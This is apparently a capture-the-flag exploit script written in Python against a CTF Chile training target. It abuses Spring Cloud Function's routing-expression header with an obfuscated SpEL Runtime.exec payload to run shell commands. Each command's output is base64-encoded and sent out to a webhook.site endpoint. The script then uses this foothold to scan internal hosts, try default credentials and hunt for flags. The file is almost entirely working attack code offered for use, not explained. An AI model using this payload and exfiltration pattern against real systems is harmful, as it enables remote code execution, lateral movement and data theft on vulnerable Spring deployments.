#!/usr/bin/env python3
"""
CTF Chile - Test del router como proxy a servicios internos
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32785"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook para test de forwarding...")
uuid_resp = requests.post("https://webhook.site/token", timeout=10)
UUID = uuid_resp.json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def forward_test(cmd, tag):
    shell = f"({cmd}) | head -5 | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    payload = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'

    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"[{r.status_code}] {tag}")
        return r.status_code == 500
    except Exception as e:
        print(f"[ERR] {tag}: {str(e)[:40]}...")
        return False

print(f"\n{'='*70}")
print("🔀 TEST DE ROUTER COMO PROXY A SERVICIOS INTERNOS")
print("🎯 Probando si el router puede acceder a servicios internos")
print(f"{'='*70}")

print(f"\n[1] TEST DE FORWARDING A SERVICIOS CONOCIDOS")
# Probar acceso directo a servicios internos a través del router del contenedor
internal_services = [
    ("10.160.209.1", "8000"),
    ("10.109.220.1", "8000")
]

for host, port in internal_services:
    print(f"\n    🔍 Probando {host}:{port}")
    forward_test(f"curl -s -m 5 http://{host}:{port}/", f"direct_{host.replace('.', '_')}_root")
    forward_test(f"curl -s -m 5 http://{host}:{port}/docs", f"direct_{host.replace('.', '_')}_docs")
    forward_test(f"curl -s -m 5 http://{host}:{port}/execute", f"direct_{host.replace('.', '_')}_execute")

print(f"\n[2] TEST DE AUTENTICACIÓN EN SERVICIOS INTERNOS")
# Probar con credenciales conocidas
auth_methods = [
    ("monitorRole", "QED"),
    ("controlRole", "R&D"),
    ("vault", "admin123")
]

for user, password in auth_methods:
    for host, port in internal_services:
        forward_test(f"curl -s -m 5 -u {user}:{password} http://{host}:{port}/execute", f"auth_{user}_{host.replace('.', '_')}")

print(f"\n[3] BUSCAR FLAGS ESPECÍFICOS EN DOCS")
for host, port in internal_services:
    forward_test(f"curl -s -m 5 http://{host}:{port}/docs | grep -i ctfchile", f"flag_docs_{host.replace('.', '_')}")
    forward_test(f"curl -s -m 5 http://{host}:{port}/redoc | grep -i ctfchile", f"flag_redoc_{host.replace('.', '_')}")

print(f"\n[4] TEST DE ROUTER COMO PROXY")
# Probar si el router local puede forwardear a los servicios internos
router_forward_tests = [
    f"curl -s http://localhost:8080/10.160.209.1:8000/docs",
    f"curl -s http://localhost:8080/internal/10.160.209.1:8000/docs",
    f"curl -s http://localhost:8080/proxy/10.160.209.1:8000/docs",
    f"curl -s -H 'X-Forward-To: http://10.160.209.1:8000/docs' http://localhost:8080/",
    f"curl -s -H 'X-Target: 10.160.209.1:8000' http://localhost:8080/docs"
]

for i, test_cmd in enumerate(router_forward_tests):
    forward_test(test_cmd, f"router_proxy_{i}")

print(f"\n[5] TEST DE ENDPOINTS CON PARÁMETROS")
# Probar si el router acepta parámetros para ruteo interno
param_tests = [
    "curl -s 'http://localhost:8080/?target=10.160.209.1:8000&path=docs'",
    "curl -s 'http://localhost:8080/route?host=10.160.209.1&port=8000&endpoint=docs'",
    "curl -s 'http://localhost:8080/forward?to=10.160.209.1:8000/docs'",
    "curl -s 'http://localhost:8080/internal?service=10.160.209.1:8000&path=docs'"
]

for i, test_cmd in enumerate(param_tests):
    forward_test(test_cmd, f"params_{i}")

print(f"\n[6] VERIFICAR CONECTIVIDAD BÁSICA")
# Verificar si podemos alcanzar los servicios internos desde el contenedor
forward_test("ping -c 1 10.160.209.1 2>/dev/null || echo 'NO_PING'", "ping_service1")
forward_test("nc -zv 10.160.209.1 8000 2>&1 || echo 'NO_NC'", "netcat_service1")
forward_test("telnet 10.160.209.1 8000 <<< 'GET / HTTP/1.0' 2>/dev/null | head -2", "telnet_service1")

print(f"\n⏰ Esperando resultados del test de forwarding...")
time.sleep(15)

# Análizar resultados
print(f"\n🔍 ANÁLISIS DE TESTS DE FORWARDING...")
try:
    r = requests.get(f"https://webhook.site/token/{UUID}/requests", timeout=20)
    data = r.json().get("data", [])

    flags_found = []
    working_connections = []
    auth_successes = []
    router_capabilities = []

    print(f"Total responses: {len(data)}")

    for req in data[:35]:
        url = req.get("url", "")
        tag = url.split(UUID)[-1].split("?")[0].lstrip("/")
        query = req.get("query", {})
        raw_data = query.get("d", "")

        if isinstance(raw_data, list):
            raw_data = raw_data[0] if raw_data else ""

        if raw_data:
            try:
                decoded = base64.b64decode(raw_data).decode("utf-8", "replace")

                print(f"\n{'='*50}")
                print(f"📡 [{tag.upper()}]")
                print(f"{'='*50}")
                print(decoded[:250])
                if len(decoded) > 250:
                    print("...")

                # Buscar flags
                if "ctfchile{" in decoded.lower():
                    flags_found.append((tag, decoded))
                    print(f"\n🚩🚩🚩 FLAG ENCONTRADO EN {tag}! 🚩🚩🚩")

                # Detectar conexiones exitosas
                if tag.startswith("direct") and len(decoded.strip()) > 10 and "NO_" not in decoded:
                    working_connections.append((tag, decoded[:100]))

                # Detectar autenticación exitosa
                if tag.startswith("auth") and "403" not in decoded and "401" not in decoded:
                    if len(decoded.strip()) > 10:
                        auth_successes.append((tag, decoded[:100]))

                # Detectar capacidades del router
                if tag.startswith("router") and len(decoded.strip()) > 10:
                    router_capabilities.append((tag, decoded[:150]))

            except Exception as e:
                print(f"\n[{tag}] (decode error): {raw_data[:100]}...")

    # Resumen de forwarding
    print(f"\n{'='*70}")
    print(f"📡 RESUMEN DE TEST DE FORWARDING")
    print(f"{'='*70}")

    if flags_found:
        print(f"🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
        for tag, flag in flags_found:
            print(f"    🎯 {tag}: {flag}")
            print(f"    ✅ ¡INFILTRACIÓN PROFUNDA COMPLETADA!")

    if working_connections:
        print(f"\n✅ CONEXIONES EXITOSAS: {len(working_connections)}")
        for tag, response in working_connections:
            print(f"    - {tag}: {response[:80]}...")

    if auth_successes:
        print(f"\n🔑 AUTENTICACIONES EXITOSAS: {len(auth_successes)}")
        for tag, response in auth_successes:
            print(f"    - {tag}: {response[:80]}...")

    if router_capabilities:
        print(f"\n🔀 CAPACIDADES DEL ROUTER: {len(router_capabilities)}")
        for tag, response in router_capabilities:
            print(f"    - {tag}: {response[:100]}...")

    if not any([flags_found, working_connections, auth_successes]):
        print(f"❌ Servicios internos no accesibles desde el contenedor")
        print(f"💡 LA FLAG PUEDE ESTAR:")
        print(f"   🔸 En el propio servicio web del puerto 32785")
        print(f"   🔸 Requerirá un bypass específico de autenticación")
        print(f"   🔸 Estará en archivos locales no encontrados aún")

except Exception as e:
    print(f"[!] Error: {e}")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")
print(f"{'='*70}")